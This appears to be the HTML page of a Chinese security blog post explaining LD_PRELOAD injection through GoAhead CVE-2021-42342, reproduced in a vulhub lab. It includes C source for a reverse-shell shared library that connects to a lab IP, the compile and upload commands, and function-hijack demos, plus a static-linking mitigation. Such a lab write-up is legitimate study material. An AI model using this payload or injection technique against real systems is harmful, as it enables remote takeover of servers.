@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+
+
+
+
+
+<head>
+    <meta charset="utf-8" />
+    <link rel="apple-touch-icon" sizes="76x76" href="/favicon.ico">
+    <link rel="icon" type="image/png" href="/favicon.ico">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no" name="viewport" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="description" content="One way to choose one">
+    <meta name="author" content="Misaki">
+    <meta name="keywords" content="">
+    <title>LD_PRELOAD变量注入 ~ Misaki&#39;s Blog</title>
+    
+<link rel="stylesheet" href="/css/Material_Icons.css">
+
+    <!-- 
+<link rel="stylesheet" href="/css/font-awesome.css">
+ -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css">
+    
+<link rel="stylesheet" href="/css/main.css">
+
+    
+        
+<link rel="stylesheet" href="/css/post.css">
+
+        
+            
+<link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+
+        
+    
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class=" sidebar-collapse">
+<nav class="navbar navbar-transparent navbar-color-on-scroll fixed-top navbar-expand-lg" color-on-scroll="100" id="sectionsNav">
+    <div class="container">
+        <div class="navbar-translate">
+            <a class="navbar-brand" href="/">
+                Misaki&#39;s Blog</a>
+            <button class="navbar-toggler" type="button" data-toggle="collapse" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="navbar-toggler-icon"></span>
+                <span class="navbar-toggler-icon"></span>
+                <span class="navbar-toggler-icon"></span>
+            </button>
+        </div>
+            <div class="collapse navbar-collapse">
+                <ul class="navbar-nav ml-auto">
+                    
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" href="/archives/">
+                                    archives
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" href="/about/">
+                                    about
+                                </a>
+                            </li>
+                        
+                    
+                    
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://github.com/MisakiKata" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-github"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://www.t00ls.net/members-profile-12179.html" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-twitch"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://misakikata.github.io/atom.xml" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-rss"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="mailto:misakikatas@gmail.com" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-envelope"></i>
+                                </a>
+                            </li>
+                        
+                            <li class="nav-item">
+                                <a class="nav-link" rel="tooltip" title="" data-placement="bottom" href="https://raw.githubusercontent.com/MisakiKata/misakikata.github.io/master/img/wxmini.png" target="_blank" data-original-title="See me here">
+                                    <i class="fa fa-comments"></i>
+                                </a>
+                            </li>
+                        
+                    
+                </ul>
+            </div>
+    </div>
+</nav>
+    
+  <div class="page-header header-filter" data-parallax="true" style="background-image: url('/img/post-banner.jpg'); height: 70vh;">
+    
+      <div class="container">
+        <h1 class="title text-center post_title">LD_PRELOAD变量注入</h1>
+        <p class="text-center"><b>Friday, July 1st 2022, 6:31 pm</b></p>
+      </div>
+    
+  </div>
+
+  
+  
+  
+    <div class="row" style="margin: 0 0 0; z-index: 999;">
+  <div class="col-md-8 offset-md-1">
+    <div class="main main-raised">
+      <div class="container">
+        <div class="section">
+          <div class="post_content">
+              <h3 id="环境变量注入"><a href="#环境变量注入" class="headerlink" title="环境变量注入"></a>环境变量注入</h3><p>前两天看到一个ACTF的WP，由于没有参加，所以不太清楚题目，但是其中有一个gogogo的题目，利用的是环境变量的注入方式，而且还是LD_PRELOAD劫持。这个漏洞是GoAhead的一个CVE-2021-42342。</p>
+<h3 id="CVE-2021-42342"><a href="#CVE-2021-42342" class="headerlink" title="CVE-2021-42342"></a>CVE-2021-42342</h3><p>先复现一下这个漏洞，直接利用vulhub的靶场，<code>/vulhub/goahead/CVE-2021-42342</code>。</p>
+<p>访问<code>http://127.0.0.1:8080/cgi-bin/index</code>，在这个地方上传一个恶意的so文件。</p>
+<pre class="line-numbers language-none"><code class="language-none">#include&lt;stdio.h&gt;
+#include&lt;stdlib.h&gt;
+#include&lt;sys&#x2F;socket.h&gt;
+#include&lt;netinet&#x2F;in.h&gt;
+char *server_ip&#x3D;&quot;192.168.36.138&quot;;
+uint32_t server_port&#x3D;1234;
+static void reverse_shell(void) __attribute__((constructor));
+static void reverse_shell(void)
+&#123;
+    int sock &#x3D; socket(AF_INET, SOCK_STREAM, 0);
+    struct sockaddr_in attacker_addr &#x3D; &#123;0&#125;;
+    attacker_addr.sin_family &#x3D; AF_INET;
+    attacker_addr.sin_port &#x3D; htons(server_port);
+    attacker_addr.sin_addr.s_addr &#x3D; inet_addr(server_ip);
+    if(connect(sock, (struct sockaddr *)&amp;attacker_addr,sizeof(attacker_addr))!&#x3D;0)
+        exit(0);
+    dup2(sock, 0);
+    dup2(sock, 1);
+    dup2(sock, 2);
+    execve(&quot;&#x2F;bin&#x2F;bash&quot;, 0, 0);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>编译如上的文件</p>
+<pre class="line-numbers language-none"><code class="language-none">gcc -s -shared -fPIC .&#x2F;hack.c -o hack.so  #由于对so有大小限制，这里才带-s参数。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>生成一个so文件后，可以直接利用给出的poc.py发送。或者也可以利用BURP构造包来发送。</p>
+<pre class="line-numbers language-none"><code class="language-none">python poc.py http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;cgi-bin&#x2F;index hack.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>如果需要使用burp来构造包则需要注意一点就是保持文件描述符不被关闭，关闭选项上repeater的第一个update选项，同时修改包中的Content-Length长度，由于我的so是14384字节，这里改成15000.最后再用多余的字节填充到比15000多一些即可。</p>
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202207011831808.png" alt="image-20220701155215245"></p>
+<h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p>通过上面这个漏洞的利用，可以看到使用了LD_PRELOAD这个环境变量，这个东西影响程序的运行时的链接（Runtime linker），它允许在程序运行前定义优先加载的动态链接库。</p>
+<p>LD_PRELOAD环境变量相信都在PHP绕过<strong>disable_function</strong>函数的时候见过，就是利用劫持进行覆写相关的函数来执行恶意的so。</p>
+<p>如果需要实现这种注入攻击的方式，则至少需要满足：</p>
+<ol>
+<li>能够上传自己的.so文件</li>
+<li>能够控制环境变量的值（设置LD_PRELOAD变量），比如<strong>putenv</strong>函数</li>
+</ol>
+<p>如果还需要绕过disable_function，还需要一个外部功能的函数可以执行，常见的比如PHP的mail函数。</p>
+<p>这里用一个编写的demo，比如我们想劫持/usr/bin/grep命令，可以先查看ls的动态链接库文件，<code>readelf -Ws</code>来查看。</p>
+<p><img src="file://E:\Typora%20File\typroa%E5%9B%BE%E5%83%8F%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5\image-20220701163415305.png?lastModify=1656671436" alt="image-20220701163415305"></p>
+<p>这里我们选用<code>strcpy@GLIBC_2.2.5 (3)</code>这个链接库。</p>
+<pre class="line-numbers language-none"><code class="language-none">#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+​
+void payload() &#123;
+    system(&quot;id&quot;);
+&#125;
+​
+char *strcpy(char *dest, const char *src) &#123;   &#x2F;&#x2F;需要搜索查看函数的原型
+    if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123;
+        return 0;
+    &#125;
+    unsetenv(&quot;LD_PRELOAD&quot;);
+    payload();
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>或者，这个<code>__attribute__((constructor))</code>的意思是先于main()函数调用 ，这种情况下大部分函数都可以劫持到。</p>
+<pre class="line-numbers language-none"><code class="language-none">#include &lt;unistd.h&gt;
+​
+static void before(void) __attribute__((constructor));
+​
+static void before(void)
+&#123;
+    unsetenv(&quot;LD_PRELOAD&quot;);
+    system(&quot;id&quot;);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>编译</p>
+<pre class="line-numbers language-none"><code class="language-none">gcc -s hack.c -fPIC -shared -o hack.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>把这个so加入到环境变量中</p>
+<pre class="line-numbers language-none"><code class="language-none">export LD_PRELOAD&#x3D;$PWD&#x2F;hack.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202207011830676.png" alt="image-20220701163438797"></p>
+<p><strong>禁用</strong></p>
+<p>使用gcc的-static参数可以把libc.so.6静态链入执行程序中。但这也就意味着你的程序不再支持动态链接。</p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1399/">https://tttang.com/archive/1399/</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Y_02LhQsGa8jhoA7qmSWLw">https://mp.weixin.qq.com/s/Y_02LhQsGa8jhoA7qmSWLw</a></p>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1493">https://forum.butian.net/share/1493</a></p>
+
+          </div>
+          <br><br>
+              
+                <div class="license-wrapper">
+                    <p>原文作者：<a href="https://misakikata.github.io">Misaki</a>
+                    <p>原文链接：<a href="https://misakikata.github.io/2022/07/LD-PRELOAD%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/">https://misakikata.github.io/2022/07/LD-PRELOAD%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/</a>
+                    <p>发表日期：<a href="https://misakikata.github.io/2022/07/LD-PRELOAD%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/">July 1st 2022, 6:31:39 pm</a>
+                    <p>更新日期：<a href="https://misakikata.github.io/2022/07/LD-PRELOAD%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/">July 1st 2022, 6:31:39 pm</a>
+                    <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+                </div>
+              
+          <br><br>
+          <div>
+              <p>
+                       
+                      <span class="badge badge-default">#&nbsp;web安全</span>
+                      &nbsp;
+                      
+              </p>
+          </div>
+        </div>
+      </div>  
+    </div>
+  </div>
+  <!-- TOC -->
+  
+      <div class="">
+        <div id="toc">
+          <p class="toc-title"><i class="material-icons" style="vertical-align:middle">toc</i>Toc:</p> 
+          <div id="tocbot"></div>
+        </div>
+      </div>
+  
+</div>
+
+
+<!-- Comments -->
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+    
+        
+            <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script>               
+        var disqus_shortname = '';
+        var disqus_config = function () {
+            this.page.url = 'https://misakikata.github.io/2022/07/LD-PRELOAD变量注入/'; 
+            this.page.identifier = '/2022/07/LD-PRELOAD变量注入/';
+        };
+        (function() { 
+            var d = document, s = d.createElement('script');
+            s.type = 'text/javascript';
+            s.src = '//'+disqus_shortname+'.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
+</div>
+        
+    
+    </div>
+</div>
+  
+
+<footer class="footer footer-default">
+        <div class="container">
+          <div class="float-left" style="padding: 15px 0;">
+              <b>假如今天的你被生活辜负了，别伤心，因为明天生活还会继续辜负你！</b>
+          </div>
+          <div align="right" style="padding: 15px 0;">
+              <i class="iconfont icon-love" ></i>
+              <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
+          </div>
+        </div>
+</footer>
+      <!--   Core JS Files   -->
+      
+<script src="/js/core/jquery.min.js?v=3.2.1.js"></script>
+
+      
+<script src="/js/main.js"></script>
+
+      
+<script src="/js/core/popper.min.js"></script>
+
+      
+<script src="/js/core/bootstrap-material-design.min.js"></script>
+
+      
+<script src="/js/plugins/moment.min.js"></script>
+
+      
+<script src="/js/material-kit.min.js?v=2.0.5.js"></script>
+
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+        
+<script src="/js/post.js"></script>
+
+        
+<script src="/js/plugins/prettify.js"></script>
+
+        <script>
+            $(document).ready(function(){
+                $('pre').addClass('prettyprint linenums');
+                prettyPrint();
+            })
+        </script>
+      
+<script src="/live2d-widget/autoload.js"></script>
+</body>
+</html>
